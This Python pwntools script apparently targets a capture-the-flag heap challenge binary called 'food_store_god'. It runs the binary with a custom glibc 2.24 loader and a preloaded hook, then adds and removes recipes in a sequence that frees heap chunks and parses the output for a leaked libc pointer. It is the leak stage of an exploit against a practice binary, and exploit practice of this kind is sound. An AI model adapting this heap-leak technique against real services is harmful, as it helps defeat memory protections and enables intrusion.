import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
env={'LD_LIBRARY_PATH':DIR,'LD_PRELOAD':DIR+'/hook.so'}
logf=open(DIR+'/h3.log','w')
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env=env,stderr=logf)
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
def mark(t): logf.flush(); logf.write("=== %s ===\n"%t); logf.flush()
ru(b'Your name: '); sl(b'AAAA')
def add(title, ing=b'0'):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1')
    ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    ru(b'Choose ingredient :'); sl(ing)
    ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def make(nm):
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3')
    ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
def remove(title):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2')
    ru(b'Title :'); sl(title); ru(b'Your choice: '); sl(b'4')
mark("addR"); add(b'RRRRRRRR')
mark("bar1");  make(b'bar1')
mark("addF"); add(b'FFFFFFFF')
mark("bar2");  make(b'bar2')
mark("removeR"); remove(b'RRRRRRRR')
mark("removeF"); remove(b'FFFFFFFF')
mark("addRnew"); add(b'NEWRECIPE')
mark("show")
ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
# read listing until recipe submenu prompt
data=ru(b'$$$$$$$$$$$$$$$$$$$$$$$$$$',timeout=3)
logf.flush()
sys.stdout.write("=== SHOW OUTPUT ===\n")
sys.stdout.write(repr(data)+"\n")
# try to extract libc leak: find 'Title : ' entries
import re
for m in re.finditer(rb'Title : ([^\n]*)\n', data):
    t=m.group(1)
    if any(b>=0x7f for b in t) or len(t)>=5:
        print("TITLE:", t, "->", t.hex())
sl(b'4'); 
try: sl(b'7')
except: pass
